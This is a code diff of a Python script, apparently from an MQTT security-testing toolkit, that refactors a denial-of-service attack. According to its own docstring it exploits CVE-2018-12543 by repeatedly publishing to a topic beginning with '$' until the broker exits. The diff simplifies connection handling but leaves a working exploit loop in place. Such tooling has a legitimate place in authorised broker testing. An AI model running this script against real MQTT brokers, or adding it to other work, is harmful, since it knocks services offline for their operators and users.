@@ -1,42 +1,31 @@
 import argparse
-
+import random
 import mqtt_utilities as util
 import paho.mqtt.client as mqtt
 import time
-import socket
-import random
 
 
 def main(username, password, duration=10):
     """The dollar char dos attack publishes messages to an existing topic with name beginning in $ causing the broker to exit by exploiting CVE-2018-12543"""
-
-    reconnect_delay = 10
-    connection = util.Connection_status()
     start_time = time.time()
-    while True:
-        client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, userdata={"connection": connection},
-                             protocol=mqtt.MQTTv311)
-        client.username_pw_set(username, password)
-        client.on_connect = util.on_connect
-        client.on_disconnect = util.on_disconnect
-        client.on_publish = util.on_publish
-        if util.connect_client(client, connection, reconnect_delay):
-            while connection.connected:
-                client.publish("$test/test", "whatever")
-                elapsed_time = time.time() - start_time
-                print("Execution time: " + str(elapsed_time))
-                time.sleep(0.5)
-                if elapsed_time >= duration:
-                    print("Time elapsed, execution is terminating...", flush=True)
-                    return
-        else:
+    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2,
+                         protocol=mqtt.MQTTv311)
+    client.username_pw_set(username, password)
+    client.on_connect = util.on_connect
+    client.on_disconnect = util.on_disconnect
+    client.on_publish = util.on_publish
+    if util.connect_client(client):
+        while True:
+            client.publish("$test/test", "whatever")
+            time.sleep(random.random() * 0.1)
             elapsed_time = time.time() - start_time
             print("Execution time: " + str(elapsed_time))
             if elapsed_time >= duration:
                 print("Time elapsed, execution is terminating...", flush=True)
+                client.disconnect()
                 return
-            print(f"Resetting client and retrying connection in {reconnect_delay} seconds...", flush=True)
-            time.sleep(random.randint(1, 2))
+    else:
+        print(f"Broker not reachable, ending script...", flush=True)
 
 
 if __name__ == "__main__":
